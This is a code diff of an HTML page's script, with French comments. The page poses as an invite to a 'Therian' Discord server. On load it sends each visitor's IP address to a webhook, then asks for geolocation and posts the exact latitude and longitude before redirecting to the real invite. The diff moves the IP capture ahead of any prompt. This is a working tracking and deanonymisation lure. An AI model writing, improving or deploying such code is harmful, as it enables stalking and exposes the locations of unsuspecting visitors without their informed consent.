@@ -39,7 +39,7 @@
         const data = await response.json();
         return data.ip;
       } catch (error) {
-        console.error("Error getting IP:", error);
+        console.error("Erreur récupération IP:", error);
         return null;
       }
     }
@@ -49,51 +49,50 @@
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `🌐 Adresse IP détectée : ${ip}`
-          })
+          body: JSON.stringify({ content: `🌐 Adresse IP détectée : ${ip}` })
         });
       } catch (error) {
-        console.error("Error sending IP:", error);
+        console.error("Erreur envoi IP:", error);
       }
     }
 
-    async function envoyerPosition(position) {
+    async function sendPosition(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lng = position.coords.longitude.toFixed(6);
-
       try {
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
-          })
+          body: JSON.stringify({ content: `📍 Localisation :\nLatitude: ${lat}\nLongitude: ${lng}` })
         });
       } catch (e) {}
+    }
 
+    async function envoyerDonnees() {
+      // Récupération IP immédiate
       const ip = await getIP();
-      if (ip) {
-        await sendIP(ip);
-      }
+      if (ip) await sendIP(ip);
 
-      // Redirection après envoi IP + position
-      window.location.href = REDIRECT_URL;
-    }
-
-    function erreurPosition(error) {
-      // Si refusée → juste rediriger
-      window.location.href = REDIRECT_URL;
-    }
-
-    window.onload = function() {
+      // Vérifier la géolocalisation
       if ("geolocation" in navigator) {
-        document.getElementById("titre").innerText = "Activer la localisation pour rejoindre le serveur Discord Therian";
-        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            // Si autorisée → envoyer position après IP
+            await sendPosition(position);
+            window.location.href = REDIRECT_URL;
+          },
+          () => {
+            // Si refusée ou désactivée → juste redirection après IP
+            window.location.href = REDIRECT_URL;
+          }
+        );
       } else {
+        // Pas de geolocation → redirection après IP
         window.location.href = REDIRECT_URL;
       }
-    };
+    }
+
+    window.onload = envoyerDonnees;
   </script>
 </body>
 </html>
